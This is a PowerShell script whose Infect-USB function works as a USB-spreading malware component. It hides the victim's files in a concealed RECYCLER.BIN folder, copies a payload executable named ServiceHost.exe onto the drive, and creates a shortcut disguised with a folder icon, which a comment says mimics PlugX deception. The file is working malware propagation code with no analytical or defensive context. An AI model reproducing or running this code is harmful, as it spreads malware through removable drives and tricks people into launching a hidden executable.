param (
    [string]$DriveLetter
)

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$crackedSoftwareFolder = "C:\Windows\Temp\WindowsServices"
$crackedSoftwareExe = "$crackedSoftwareFolder\SystemCore\ServiceHost.exe"

function Infect-USB {
    param ($DriveLetter)
    $usbPath = "$DriveLetter\"
    $recyclerPath = "$usbPath\RECYCLER.BIN"
    $filesPath = "$recyclerPath\Files"
    $usbSoftwareFolder = "$usbPath\WindowsServices"
    $lnkPath = "$usbPath\SystemTools.lnk"
    try {
        Add-Content -Path $logPath -Value "Detected USB at $usbPath. Starting infection process..."
        if (-not (Test-Path -Path $recyclerPath)) {
            New-Item -Path $recyclerPath -ItemType Directory -Force | Out-Null
            Set-ItemProperty -Path $recyclerPath -Name Attributes -Value "Hidden" -ErrorAction Stop
            Add-Content -Path $logPath -Value "Created hidden RECYCLER.BIN folder at $recyclerPath"
        }
        if (-not (Test-Path -Path $filesPath)) {
            New-Item -Path $filesPath -ItemType Directory -Force | Out-Null
            Add-Content -Path $logPath -Value "Created Files folder at $filesPath"
        }
        Get-ChildItem -Path $usbPath -File | ForEach-Object {
            if ($_.FullName -ne $lnkPath -and $_.FullName -ne $usbSoftwareFolder -and $_.Extension -ne ".lnk") {
                Move-Item -Path $_.FullName -Destination $filesPath -Force -ErrorAction Stop
                Add-Content -Path $logPath -Value "Moved file $($_.Name) to $filesPath"
            }
        }
        if (Test-Path -Path $crackedSoftwareFolder) {
            Copy-Item -Path $crackedSoftwareFolder -Destination $usbPath -Recurse -Force -ErrorAction Stop
            Add-Content -Path $logPath -Value "Copied WindowsServices folder to $usbSoftwareFolder"
        } else {
            Add-Content -Path $logPath -Value "Warning: WindowsServices folder not found at $crackedSoftwareFolder, cannot copy to USB."
        }
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnkPath)
        $shortcut.TargetPath = "$usbSoftwareFolder\SystemCore\ServiceHost.exe"
        $shortcut.IconLocation = "%SystemRoot%\system32\imageres.dll,2" # Mimics PlugX folder icon deception
        $shortcut.WorkingDirectory = "$usbSoftwareFolder\SystemCore"
        $shortcut.Save()
        Add-Content -Path $logPath -Value "Created deceptive shortcut at $lnkPath pointing to $usbSoftwareFolder\SystemCore\ServiceHost.exe"
    } catch {
        Add-Content -Path $logPath -Value "Failed to infect USB at $usbPath. Error: $_"
    }
}

if ($DriveLetter) {
    Infect-USB -DriveLetter $DriveLetter
}